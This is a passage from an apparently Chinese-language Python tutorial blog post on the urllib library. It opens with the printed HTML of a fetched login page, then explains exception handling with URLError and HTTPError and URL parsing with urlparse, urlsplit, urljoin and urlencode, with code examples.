&#125;);</span><br><span class="line"></span><br><span class="line">        var tab_li = $(<span class="string">".login-area .tab li"</span>);</span><br><span class="line">        tab_li.on(<span class="string">"click"</span>, function () &#123;</span><br><span class="line">            var i = $(this).index();</span><br><span class="line">            tab_li.removeClass(<span class="string">"active"</span>);</span><br><span class="line">            $(this).addClass(<span class="string">"active"</span>);</span><br><span class="line">            $(<span class="string">".tab-con .item"</span>).hide();</span><br><span class="line">            $(<span class="string">".tab-con .item"</span>).eq(i).show();</span><br><span class="line">        &#125;)</span><br><span class="line">        var inp = $(<span class="string">".item input[type='text']"</span>);</span><br><span class="line">        var login_btn = $(<span class="string">"#login"</span>);</span><br><span class="line">        inp.on(<span class="string">"input"</span>, function () &#123;</span><br><span class="line">            btnControl();</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        function btnControl() &#123;</span><br><span class="line">            var flag = true;</span><br><span class="line">            inp.each(function () &#123;</span><br><span class="line">                <span class="keyword">if</span> (!$(this).val()) &#123;</span><br><span class="line">                    flag = false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                login_btn.removeClass(<span class="string">"disable"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                login_btn.addClass(<span class="string">"disable"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 点击密码可看不可看</span><br><span class="line">        $(<span class="string">'.clickLook'</span>).on(<span class="string">'click'</span>, function () &#123;</span><br><span class="line">            <span class="keyword">if</span> ($(this).attr(<span class="string">'isClick'</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                $(this).siblings(<span class="string">'input'</span>).attr(<span class="string">'type'</span>, <span class="string">'password'</span>);</span><br><span class="line">                $(this).attr(<span class="string">'src'</span>, <span class="string">'/nervous/images/not_look.png'</span>);</span><br><span class="line">                $(this).attr(<span class="string">'isClick'</span>, <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $(this).siblings(<span class="string">'input'</span>).attr(<span class="string">'type'</span>, <span class="string">'text'</span>);</span><br><span class="line">                $(this).attr(<span class="string">'src'</span>, <span class="string">'/nervous/images/look.png'</span>);</span><br><span class="line">                $(this).attr(<span class="string">'isClick'</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        // 点击注册</span><br><span class="line">        $(<span class="string">'.register span'</span>).on(<span class="string">'click'</span>, function () &#123;</span><br><span class="line">            //$(<span class="string">'.login-box,.register-unit'</span>).hide();</span><br><span class="line">            //$(<span class="string">'.register-area'</span>).show();</span><br><span class="line">            window.location.href = <span class="string">"http://passport2.chaoxing.com/register3?refer=http://i.chaoxing.com"</span>;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        // 点击去登录</span><br><span class="line">        $(<span class="string">'.go-login span'</span>).on(<span class="string">'click'</span>, function () &#123;</span><br><span class="line">            $(<span class="string">'.login-box'</span>).show();</span><br><span class="line">            $(<span class="string">'.register-area'</span>).hide();</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        document.onkeydown = function (event) &#123;</span><br><span class="line">        var e = event || window.event;</span><br><span class="line">        <span class="keyword">if</span> (e &amp;&amp; e.keyCode == <span class="number">13</span>) &#123;</span><br><span class="line">                $(<span class="string">"#login"</span>).click();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;; </span><br><span class="line">    &#125;)()</span><br><span class="line"></span><br><span class="line">    // 机构账号登录</span><br><span class="line">function orgLogin() &#123;</span><br><span class="line">type=<span class="number">2</span>;</span><br><span class="line">        $(<span class="string">".marsker,.unitPopup"</span>).show();</span><br><span class="line">$(<span class="string">"#org_info"</span>).html(<span class="string">"&lt;i&gt;切换单位&lt;/i&gt;"</span>).removeAttr(<span class="string">"fid"</span>).removeAttr(<span class="string">"domain"</span>);</span><br><span class="line">getProvince();</span><br><span class="line">getImgCode();</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">function load()&#123;</span><br><span class="line">$(<span class="string">'#iframe'</span>).attr(<span class="string">'src'</span>, $(<span class="string">'#iframe'</span>).attr(<span class="string">'src'</span>));</span><br><span class="line">&#125;</span><br><span class="line">//搜索单位回车</span><br><span class="line">    function keydowdSearch(event)&#123;</span><br><span class="line">        <span class="keyword">if</span>(event.keyCode==<span class="number">13</span>)&#123;</span><br><span class="line">            $(<span class="string">".popupResult"</span>).hide();</span><br><span class="line">            $(<span class="string">".searchResult"</span>).show();</span><br><span class="line">            searchOrgList();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">function prevlogin()&#123;</span><br><span class="line">    var username = $(<span class="string">"#uin_tips"</span>).val();</span><br><span class="line">    var pattern = new RegExp(<span class="string">"[`~!@#$^&amp;*()=|&#123;&#125;':;',\\[\\].&lt;&gt;《》/?~！@#￥……&amp;*（）——|&#123;&#125;【】‘；：”“'。，、？]"</span>);</span><br><span class="line">        <span class="keyword">if</span>(pattern.test(username))&#123; // 特殊符号验证</span><br><span class="line">        $(<span class="string">"#uin_error"</span>).html(<span class="string">"请输入正确的手机号/超星号"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (escape(username).indexOf(<span class="string">"%u"</span>)!=<span class="number">-1</span>)&#123;   // 文字验证 </span><br><span class="line">$(<span class="string">"#uin_error"</span>).html(<span class="string">"请输入正确的手机号/超星号"</span>);</span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">&#125;   </span><br><span class="line">vlogin();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">Process finished <span class="keyword">with</span> exit code <span class="number">0</span></span><br></pre></td></tr></table></figure><p>通过上面的方法，我们可以实现大多数的请求功能的设置了。<br>这边说urllib库中request模块的基本用法，如果想实现更多的功能，可以参考官方文档说明：<code>https://docs.python.org/3/library/urllib.request.html#basehandler-objects</code></p><h2 id="3-1-2处理异常"><a href="#3-1-2处理异常" class="headerlink" title="3.1.2处理异常"></a>3.1.2处理异常</h2><p>前面我们了解了发送请求的发送过程，但是网络不好的情况下，如果出现了异常，该怎么办呢？这时候如果不处理这些异常，程序很可能因报错而终止运行，所以异常处理还是十分有必要的。</p><p>urllib的error模块定义了由request模块产生的异常。如果出现了问题，request模块便会抛出error模块中定义的异常。</p><p><strong>1.URLError</strong></p><p><code>URLError</code>类来自<code>urllib</code>库的<code>error</code>模块，它继承自<code>OSError</code>类，是<code>error</code>异常模块的基类，由<code>request</code>模块产生的异常都可以通过捕获这个类来处理。<br>它具有一个属性<code>reason</code>，即返回错误的原因。下面用一个实验来看看输出结果，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,error</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response=request.urlopen(<span class="string">'https://hpb1-boke.github.io/a'</span>)</span><br><span class="line"><span class="keyword">except</span> error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br></pre></td></tr></table></figure><p>程序没有直接报错，而是输出了内容，通过这样的操作，我们就可以避免程序异常终止，同时异常得到了有效处理。<br><img src="https://img-blog.csdnimg.cn/20200416093327991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong>2.HTTPError</strong></p><p>它是<code>URLError</code>的子类，专门用来处理<code>HTTP</code>请求错误，比如认证请求失败等。他有如下3个属性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">code:  返回HTTP的状态码，比如<span class="number">404</span>表示网页不存在，<span class="number">500</span>表示服务器内部错误。</span><br><span class="line"></span><br><span class="line">reason:  同父类一样，用于返回错误的原因。</span><br><span class="line"></span><br><span class="line">headers: 返回请求头。</span><br></pre></td></tr></table></figure><p>下面用一个实验来看看输出结果，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,error</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response=request.urlopen(<span class="string">'https://hpb1-boke.github.io/a'</span>)</span><br><span class="line"><span class="keyword">except</span> error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason,e.code,e.headers,sep=<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200416094514749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">运行结果：<br><img src="https://img-blog.csdnimg.cn/20200416094447707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">依然是同样的网址，这里捕获了<code>HTTPError</code>异常，输出了<code>reason</code>、<code>code</code>和<code>headers</code>属性。</p><p>因为<code>URLError</code>是<code>HTTPError</code>的父类，所以可以先选择捕获子类的错误，再去捕获父类的错误，所以以上述代码更好的写法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,error</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response=request.urlopen(<span class="string">'https://hpb1-boke.github.io/a'</span>)</span><br><span class="line"><span class="keyword">except</span> error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason,e.code,e.headers,sep=<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">except</span> error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'Request SUccessfully'</span>)</span><br></pre></td></tr></table></figure><p>这样就可以做到先捕获<code>HTTPError</code>，获取它的<code>错误状态码、原因、headers</code>等信息。如果不是HTTPError异常，就会捕获到<code>URLError异常</code>，<code>输出错误的原因。最后用else来处理正常的逻辑</code>。这是一个较好处理异常的写法。<br><img src="https://img-blog.csdnimg.cn/20200416095528453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">有时候，<code>reason属性返回的不一定是字符串，也可能是一个对象，</code>再看看下面的实验，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response=urllib.request.urlopen(<span class="string">'https://baidu.com'</span>,timeout=<span class="number">0.01</span>)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(type(e.reason))</span><br><span class="line">    <span class="keyword">if</span> isinstance(e.reason,socket.timeout):</span><br><span class="line">        print(<span class="string">'TIME OUT'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200416100108904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">运行结果如下：<br><img src="https://img-blog.csdnimg.cn/20200416100129309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,colsocket.timeoutor_FFFFFF,t_70" alt="在这里插入图片描述">)可以发现，<code>reason</code>属性的结果是<code>socket.timeout</code>类。所以，这里我们可以用<code>isinstance()</code>方法来判断它的类型，做出详细的异常判断。</p><p>本节中，我们讲述了<code>error模块的相关用法</code>，通过合理地捕获异常可以做出更精确的异常判断，始程序更加稳健。</p><h2 id="3-1-3解析链接"><a href="#3-1-3解析链接" class="headerlink" title="3.1.3解析链接"></a>3.1.3解析链接</h2><p>前面说过，urllib库里还提供了parse模块，它定义了处理URL的标准接口，例如实现URL各部分的抽取、合并以及链接转换。它支持如下协议的URL处理：<code>file、ftp、gopher、hdl、http、https、imap、mailto、mms、news、nntp、prospero、rsync、rtsp、rtspu、sftp、sip、sips、snews、svn、svn+ssh、telnet和wais</code>。本节中，我们介绍一下该模块中常用的方法拉看一下它的便携之处。</p><h2 id="1-urlparse"><a href="#1-urlparse" class="headerlink" title="1.urlparse()"></a><strong>1.urlparse()</strong></h2><p>该方法可以实现<code>URL</code>的识别分段，这里先用一个实例来看一下，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span>  urlparse</span><br><span class="line">result=urlparse(<span class="string">'https://baidu.com/index.html;user?id=5#comment'</span>)</span><br><span class="line">print(type(result),result)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200416102038888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)这里我们利用urlparse()方法进行了一个URL的解析。首先，输出了解析结果的类型，然后将结果也输出出来。</p><p>运行结果如下：<br><img src="https://img-blog.csdnimg.cn/20200416102216698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">可以看到，返回结果是一个<code>ParseResult</code>类型的对象，它包含6个部分，分别是<code>scheme、netloc、path、params、query和fragment。</code><br>观察一下该实例的URL：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://baidu.com/index.html;user?id=5#comment</span><br></pre></td></tr></table></figure><p>可以发现，urlparse()方法将其拆分成了6个部分。大体观察可以发现，解析时有特定的分隔符。比如 <code>://</code>前面就是<code>scheme</code>,代表协议；第一个<code>/</code>符号前面便是<code>netloc</code>，<code>即域名</code>，<code>后面是path,即访问路径</code>；<code>分号；后面是params，代表参数</code>；<code>问号？后面是查询条件query，一般用作GET类型的URL</code>;<code>井号#后面是描点，用于直接定位页面内部的下拉位置。</code><br>所以，可以得出一个标准的链接格式，具体如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://netloc/path;params?query#fragment</span><br></pre></td></tr></table></figure><p>一个标准的<code>URL</code>都会符合这个规则，利用<code>urlparse()</code>方法可以将它拆分开来。处理这种最基本的解析协议方式外<code>，urlparse()</code>方法还有其他配置吗？接下来，看一下他的<code>API用法</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib.parse.urlparse(urlstring,scheme=<span class="string">''</span>,allow_fragments=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="urlstring-这是必填项，即解析的URL。"><a href="#urlstring-这是必填项，即解析的URL。" class="headerlink" title="urlstring: 这是必填项，即解析的URL。"></a><strong>urlstring:</strong> 这是必填项，即解析的URL。</h2><p>scheme： 它是默认的协议（比如http或https等）。假如这个链接没有带协议信息，会将这个作为默认的协议。我们用实例看一下，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">result=urlparse(<span class="string">'www.baidu.com/index.html;user?id=5#comment'</span>,scheme=<span class="string">'https'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>可以发现，我们提供的URL没有包含最前面的scheme信息，但是通过指定默认的scheme参数，返回的结果是https。<br><img src="https://img-blog.csdnimg.cn/20200416141440387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">假设我们带上了scheme，代码如下。可见，schema参数只有在URL中不包含scheme信息时才生效。如果URL中有信息，就会返回解析出的scheme。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">result=urlparse(<span class="string">'http://www.baidu.com/index.html;user?id=5#comment'</span>,scheme=<span class="string">'https'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200416141929758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="allow-fragments-即是否忽略fragment。如果它被设置为False-fragment部分就会被忽略，它会被解析为path、params或者query的一部分，而fragment部分为空。"><a href="#allow-fragments-即是否忽略fragment。如果它被设置为False-fragment部分就会被忽略，它会被解析为path、params或者query的一部分，而fragment部分为空。" class="headerlink" title="allow_fragments:即是否忽略fragment。如果它被设置为False,fragment部分就会被忽略，它会被解析为path、params或者query的一部分，而fragment部分为空。"></a>allow_fragments:即是否忽略fragment。如果它被设置为False,fragment部分就会被忽略，它会被解析为path、params或者query的一部分，而fragment部分为空。</h2><p>下面我们用实例来看一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line">result=urlparse(<span class="string">'http://www.baidu.com/index.html;user?id=5#comment'</span>,allow_fragments=<span class="literal">False</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200416142832147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">假设<code>URL</code>中不包含<code>params</code>和<code>query</code>，我们再通过实例看一下。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line">result=urlparse(<span class="string">'http://www.baidu.com/index.html#comment'</span>,allow_fragments=<span class="literal">False</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>可以发现，当URL中不包含params和query时，fragment便会被解析为path的一部分。返回结果<img src="https://img-blog.csdnimg.cn/20200416165419494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><code>ParseResult</code>实际上是一个元组，我们可以用索引顺序来获取，也可以用属性名获取，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line">result=urlparse(<span class="string">'http://www.baidu.com/index.html#comment'</span>,allow_fragments=<span class="literal">False</span>)</span><br><span class="line">print(result.scheme,result[<span class="number">0</span>],result.netloc,result[<span class="number">1</span>],sep=<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><p>这里我们分别用索引和属性名获取了<code>scheme和netloc</code>，可以发现，二者的结果是一致的，两种方法都可以成功获取。<br><img src="https://img-blog.csdnimg.cn/20200416170148478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="urlunparse"><a href="#urlunparse" class="headerlink" title="urlunparse()"></a>urlunparse()</h2><p>有了<code>urlparse()</code>，相应地就有了它的对立方法<code>urlunparse()</code>，它接受的参数是一个可迭代的对象，但是它的长度必须是6，否则会抛出数量的不足或者过多的问题。先用一个实例看一下，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlunparse</span><br><span class="line">data=[<span class="string">'http'</span>,<span class="string">'www.baidu.com'</span>,<span class="string">'index.html'</span>,<span class="string">'user'</span>,<span class="string">'a=6'</span>,<span class="string">'comment'</span>]</span><br><span class="line">print(urlunparse(data))</span><br></pre></td></tr></table></figure><p>这里参数<code>data</code>用了列表类型。当然你也可以用其他类型，比如元件或者特定的数据结构。运行结果如下所示，这样我就成功实现了对<code>URL</code>的构造。<br><img src="https://img-blog.csdnimg.cn/20200416171514653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="urlsplist"><a href="#urlsplist" class="headerlink" title="urlsplist()"></a>urlsplist()</h2><p>这个方法和<code>urlparse()</code>方法非常相似，只不过它不再单独解析<code>params</code>这一部分，只返回<code>5个结果</code>。上面例子中的<code>params会合并到path中</code>。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit</span><br><span class="line">result=urlsplit(<span class="string">'http://www.baidu.com/index.html;user?id=5#comment'</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200416194911410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">可以发现返回的结果是<code>SplitResult</code>，它其实也是一个元组类型，既可以用属性获取值，也可以用索引来获取。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlsplit</span><br><span class="line">result=urlsplit(<span class="string">'http://www.baidu.com/index.html;user?id=5#comment'</span>)</span><br><span class="line">print(result.scheme,result[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200416195200201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="urlunsplist"><a href="#urlunsplist" class="headerlink" title="urlunsplist()"></a>urlunsplist()</h2><p>与<code>urlunparse()</code>类似，它也是将链接各个部分组合成完整链接的方法，传入的参数也是一个可迭代对象，例如列表、元组等，唯一的区别是长度必须为5。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlunsplit</span><br><span class="line">data=[<span class="string">'http'</span>,<span class="string">'www.baidu.com'</span>,<span class="string">'index.html'</span>,<span class="string">'a=6'</span>,<span class="string">'comment'</span>]</span><br><span class="line">print(urlunsplit(data))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200416195721124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="urljoin"><a href="#urljoin" class="headerlink" title="urljoin()"></a>urljoin()</h2><p>有了<code>urlunparse()和urlunsplist()方法</code>，我们可以完成链接的合并，不过前提是必须要有特定长度的对象，链接的每一部分都要清晰分开。<br>此外，生成链接还有另一个方法，那就是<code>urljoin()方法</code>。我们可以提供一个<code>base_url（基础链接）</code>作为第一个参数，将新链接作为第二个参数，该方法会分析<code>base_url的scheme、netloc和path这三个内容并对新链接缺失的部分进行补充，最后返回结果。</code><br>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line">print(urljoin(<span class="string">'http://www.baidu.com'</span>,<span class="string">'FAQ.html'</span>))</span><br><span class="line">print(urljoin(<span class="string">'http://www.baidu.com'</span>,<span class="string">'https://hpb1-boke.github.io/FAQ.html'</span>))</span><br><span class="line">print(urljoin(<span class="string">'http://www.baidu.com/about.html'</span>,<span class="string">'https://hpb1-boke.github.io/FAQ.html'</span>))</span><br><span class="line">print(urljoin(<span class="string">'http://www.baidu.com/about.html'</span>,<span class="string">'https://hpb1-boke.github.io/FAQ.html?question=2'</span>))</span><br><span class="line">print(urljoin(<span class="string">'http://www.baidu.com?wd=abc'</span>,<span class="string">'https://hpb1-boke.github.io/index.php'</span>))</span><br><span class="line">print(urljoin(<span class="string">'www.baidu.com/'</span>,<span class="string">'?category=2#comment'</span>))</span><br><span class="line">print(urljoin(<span class="string">'www.baidu.com#comment'</span>,<span class="string">'?category=2'</span>))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200416200912775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncGVuZ2Jpbg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">可以发现，<code>base_url提供了三项内容scheme、netloc和path。如果这3项在新链接里不存在，就予以补充；如果新链接存在，就使用新链接的部分。而base_url中的params、query和fragment是不起作用的。</code><br>通过urljoin()方法，我们可以轻松实现链接解析、拼和与生成。</p><h2 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode()"></a>urlencode()</h2><p>这里我们再介绍一个常用的方法—<code>urlencode()</code>，它在构造<code>GET</code>请求参数的时候的时候非常有用，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line">params =&#123;</span><br><span class="line">    <span class="string">'name'</span>:<span class="string">'germey'</span>,</span><br><span class="line">    <span class="string">'age'</span>:<span class="number">22</span></span><br><span class="line">&#125;</span><br><span class="line">base_url=<span class="string">'http://www.baidu.com?'</span></span><br><span class="line">url=base_url+urlencode(params)</span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure><p><img 